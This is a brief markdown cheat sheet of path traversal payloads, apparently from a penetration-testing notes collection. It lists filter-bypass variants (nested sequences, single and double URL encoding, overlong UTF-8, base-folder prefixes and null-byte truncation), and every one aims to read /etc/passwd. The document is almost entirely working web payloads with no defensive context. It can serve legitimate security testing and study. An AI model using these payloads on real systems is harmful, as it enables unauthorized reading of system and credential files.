---
title: Path Traversal
order: 2
---

## TIPS

- Normal traversal
    
    ```
    ../../../etc/passwd
    ```
    
- Absolute path
    
    ```
    /etc/passwd
    ```
    
- Nested traversal
    
    ```
    ....//....//etc/passwd
    ```
    
- URL Encode
    
    ```
    %2e%2e%2f
    ```
    
- Double URL Encode
    
    ```
    %252e%252e%252f
    ```
    
- Non-standard encoding
    
    ```
    ..%c0%af
    ```
    
- Base folder bypass
    
    ```
    /var/www/images/../../../etc/passwd
    ```
    
- Null byte 
    
    ```
    ../../../etc/passwd%00.png
    ```